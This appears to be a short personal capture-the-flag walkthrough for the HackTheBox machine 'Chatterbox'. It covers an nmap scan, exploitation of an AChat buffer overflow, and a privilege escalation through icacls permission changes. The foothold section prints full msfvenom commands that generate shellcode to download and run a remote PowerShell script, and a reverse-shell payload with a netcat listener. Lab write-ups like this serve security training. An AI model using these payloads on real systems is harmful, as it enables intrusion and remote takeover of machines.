----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Chatterbox
# 11/4/2023
10.10.10.74

----------------------------------------------------
# nmap
----------------------------------------------------
└─$  nmap -sT -p- --min-rate 5000 --max-retries 1 10.10.10.74    
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

----------------------------------------------------
# foothold
----------------------------------------------------
└─$ searchsploit Achat                  

https://www.exploit-db.com/raw/36025

Exploitation
AChat Buffer Overflow
Exploit: https://www.exploit-db.com/exploits/36025/
Using msfvenom, it is possible to generate shellcode for use in the above exploit. The command
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object
Net.WebClient).downloadString('http://<LABIP>/writeup.ps1')\"" -e x86/unicode_mixed -b
'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\
x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa
9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\
xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\x
d5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea
\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
BufferRegister=EAX -f python will generate shellcode which downloads and executes a
powershell script from the attacking machine. Opening a reverse shell is fairly trivial.


-->
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

└─$ rlwrap nc -lvnp 1234 

cope buffer from msfvenom and add to python exploit,modify python exploit target ip and run
you get rev shell

----------------------------------------------------
# priv esc
----------------------------------------------------
C:\Users\Administrator\Desktop>net user Alfred

C:\Users\Administrator\Desktop>whoami /priv

C:\Users\Administrator\Desktop>systeminfo

C:\Users\Administrator\Desktop>icacls root.txt

C:\Users\Administrator\Desktop>dir /q root.txt

C:\Users\Administrator\Desktop>icacls root.txt /grant Alfred:F
